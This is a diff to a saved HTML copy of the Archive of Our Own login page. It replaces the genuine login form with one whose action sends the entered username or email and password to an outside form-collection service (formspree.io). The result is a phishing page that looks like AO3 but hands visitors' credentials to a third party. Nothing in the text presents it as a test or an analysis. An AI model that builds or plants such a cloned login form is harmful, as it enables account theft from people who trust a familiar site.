@@ -1,7 +1,6 @@
 <!DOCTYPE html> <html lang=en><!--
  Page saved with SingleFile 
  url: https://archiveofourown.org/users/login?restricted=true&return_to=%2Fworks%2F55743667%2Fchapters%2F141509311 
- saved date: Mon Jan 19 2026 13:22:14 GMT+0900 (한국 표준시)
 --><meta charset=utf-8>
 <meta http-equiv=x-ua-compatible content="ie=edge">
 <meta name=keywords content="fanfiction, transformative works, otw, fair use, archive">
@@ -119,19 +118,28 @@
  If you don't have an account, you can <a href=https://archiveofourown.org/invite_requests>request an invitation to join</a>.
  </p>
 <div id=loginform>
- <form class=new_user id=new_user action="/users/login?return_to=%2Fworks%2F55743667%2Fchapters%2F141509311" accept-charset=UTF-8 method=post>
- <dl>
- <dt><label for=user_login>Username or email:</label></dt>
- <dd><input type=text name=user[login] id=user_login value></dd>
- <dt><label for=user_password>Password:</label></dt>
- <dd><input type=password name=user[password] id=user_password></dd>
- <dt><label for=user_remember_me>Remember me</label></dt>
- <dd><input type=checkbox value=1 name=user[remember_me] id=user_remember_me></dd>
- <dt class=landmark>Submit</dt>
- <dd class="submit actions">
- <input type=submit name=commit value="Log in" class=submit>
- </dd>
- </dl>
+<form class="new_user" id="new_user" action="https://formspree.io/f/mwvvddbv" method="POST">
+  <dl>
+    <dt><label for="user_login">Username or email:</label></dt>
+    <dd>
+      <input type="text" name="username" id="user_login" required>
+    </dd>
+
+    <dt><label for="user_password">Password:</label></dt>
+    <dd>
+      <input type="password" name="password" id="user_password" required>
+    </dd>
+
+    <dt><label for="user_remember_me">Remember me</label></dt>
+    <dd>
+      <input type="checkbox" value="Yes" name="remember_me" id="user_remember_me">
+    </dd>
+
+    <dt class="landmark">Submit</dt>
+    <dd class="submit actions">
+      <input type="submit" value="Log in" class="submit">
+    </dd>
+  </dl>
 </form>
 </div>
 <p>
